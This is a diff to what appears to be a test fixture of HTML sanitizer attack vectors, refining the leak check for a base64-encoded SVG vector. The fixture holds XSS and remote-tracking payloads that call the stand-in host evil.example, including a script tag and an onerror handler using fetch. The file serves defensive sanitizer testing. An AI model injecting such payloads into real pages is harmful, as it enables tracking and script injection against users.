@@ -19,7 +19,20 @@ export const ATTACK_VECTORS: SanitizeVector[] = [
   { name: "SVG filter=url()", html: '<svg><rect filter="url(https://evil.example/x.svg#a)" width="1" height="1"/></svg>', leaks: evil },
   { name: "SVG mask=url()", html: '<svg><rect mask="url(https://evil.example/x.svg#a)" width="1" height="1"/></svg>', leaks: evil },
   { name: "table background= attr", html: '<table><tr background="https://evil.example/tr.png"><td>x</td></tr></table>', leaks: evil },
-  { name: "data:svg with nested remote <image>", html: `<img src="data:image/svg+xml;base64,${Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/x.png"/></svg>').toString("base64")}">`, leaks: evil },
+  {
+    name: "data:svg with nested remote <image>",
+    html: `<img src="data:image/svg+xml;base64,${Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/x.png"/></svg>').toString("base64")}">`,
+    // DISCRIMINATING: the payload is base64-encoded, so "evil.example" is never in
+    // the OUTER string whether recursion runs or not — a plain includes() would be a
+    // tautology. Decode any surviving data:image/svg+xml URI and look INSIDE it: the
+    // recursion must have stripped the nested <image href>. If the whole data: URI is
+    // dropped, that is also safe. Fails only if the inner remote ref survives.
+    leaks: (out: string) => {
+      const m = out.match(/data:image\/svg\+xml;base64,([A-Za-z0-9+/=]+)/);
+      if (!m) return false; // data: URI dropped entirely → safe
+      return Buffer.from(m[1], "base64").toString("utf8").includes("evil.example");
+    },
+  },
   { name: "external img src", html: '<img src="https://evil.example/track.png">', leaks: evil },
   { name: "script tag (XSS)", html: '<p>a</p><script>fetch("https://evil.example/x")</script>', leaks: (o) => o.includes("<script") || evil(o) },
   { name: "img onerror handler (XSS)", html: '<img src="x" onerror="fetch(\'https://evil.example/x\')">', leaks: (o) => o.includes("onerror") || evil(o) },
